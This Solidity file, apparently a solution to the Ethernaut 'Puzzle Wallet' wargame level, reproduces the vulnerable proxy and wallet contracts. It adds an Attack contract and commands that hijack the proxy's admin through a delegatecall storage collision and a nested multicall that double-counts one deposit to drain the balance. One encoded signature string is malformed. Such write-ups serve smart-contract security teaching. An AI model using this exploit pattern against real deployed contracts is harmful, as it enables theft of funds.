// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.8.0;
pragma experimental ABIEncoderV2;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/proxy/UpgradeableProxy.sol";

/**
 * 你需要劫持这个钱包才能成为代理的管理员。
 * 解题思路：
 * 1.PuzzleProxy是代理合约，特点是通过call等方法调用PuzzleProxy中不存在的函数时，PuzzleProxy会delegatecall里面存放的的implementation，在本题也就是PuzzleWallet
 * 2.利用上述的特点，可以修改PuzzleProxy自身的变量，但是通过PuzzleProxy来调用PuzzleWallet中的方法时，PuzzleWallet对应位置的值会变成PuzzleProxy的
 * 3.PuzzleProxy中的pendingAdmin、admin对应PuzzleWallet中的owner和maxBalance
 * 4.想要调用setMaxBalance修改admin需要在白名单中，要求require(msg.sender == owner),因此需要先通过修改pendingAdmin来修改owner(步骤1)
 * 5.在白名单后(步骤2)可以调用setMaxBalance，发现要求require(address(this).balance == 0),需要消耗完所有余额，而唯一一个转账的函数是execute
 * 6.执行execute要求require(balances[msg.sender] >= value),需要先执行deposit,然而execute中的逻辑只能支付自己账户里的余额，代理合约里的余额依旧无法清零
 * 7.从上一点可以看出要求balances[msg.sender] == 合约余额+用户余额，需要使用multicall(步骤3)
 * 8.在上一点后，合约余额为0.002，balances[msg.sender]为2000000000000000，执行步骤4取款
 * 9.现在可以直接设置maxBalance了，执行步骤5
 */
contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin; // 有权更新智能合约的逻辑

    constructor(
        address _admin,
        address _implementation,
        bytes memory _initData
    ) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(
            pendingAdmin == _expectedAdmin,
            "Expected new admin by the current admin is not the pending admin"
        );
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner; // 控制允许使用合约的地址白名单
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    // maxBalance为0后重设
    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    // 添加白名单
    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    // 存款
    function deposit() external payable onlyWhitelisted {
        // 要求当前合约余额小于等于maxBalance
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    // 支付一笔费用，用于call to合约
    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    // 多重call
    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            // 调用存款逻辑，并且每次multicall只调用一次，本意应该是想其他次数用来调用execute，但是这里可以调用其他函数？
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

contract Attack {
    /**
     * 1.修改PuzzleProxy中的pendingAdmin，此时PuzzleProxy中的pendingAdmin为player，
     * PuzzleWallet依旧是原来的值，但是当通过PuzzleProxy调用owner()方法时，
     * 因为PuzzleProxy没有这个方法，因此实际上是delegatecall了proxy中的implementation(PuzzleWallet)
     * 所以owner()执行的是PuzzleWallet的逻辑，返回的是PuzzleProxy中的pendingAdmin值，也就是player
     */
    function modifyOwner(PuzzleProxy proxy) public view returns(bytes memory) {
        bytes memory data = abi.encodeWithSignature("proposeNewAdmin(address)", msg.sender);
        return data;
    }
    // 2.contract.addToWhitelist(player)

    // 3.想要通过multicall多次调用deposit需要绕开只能调用一次的限制，可以在multicall里再调用一次multicall
    function multiDeposit() public pure returns(bytes[] memory){
        // 调用deposit
        bytes memory data1 = abi.encodeWithSignature("deposit()");
        // 通过multicall调用deposit
        bytes[] memory bytesArray = new bytes[](1);
        bytesArray[0] = data1;
        bytes memory data2 = abi.encodeWithSignature("multicall(bytes[])", bytesArray);

        // 得到data1和data2后可以直接去网页用如下代码调用
        // contract.multicall([data1, data2], {value: toWei('0.001')})

        // 如果想在remix调用，需要再计算一次，然后在PuzzleProxy合约中Transact
        bytes[] memory bytesArray2 = new bytes[](2);
        bytesArray2[0] = data1;
        bytesArray2[1] = data2;
        bytes memory result = abi.encodeWithSignature("multicall(bytes[]", bytesArray2);

        return bytesArray2;
    }

    // 4.在PuzzleProxy合约中执行execute取款：await contract.execute(player,toWei('0.002'),0x0)

    // 5.此时余额已清零，直接设定maxBalance：await contract.setMaxBalance(player)
}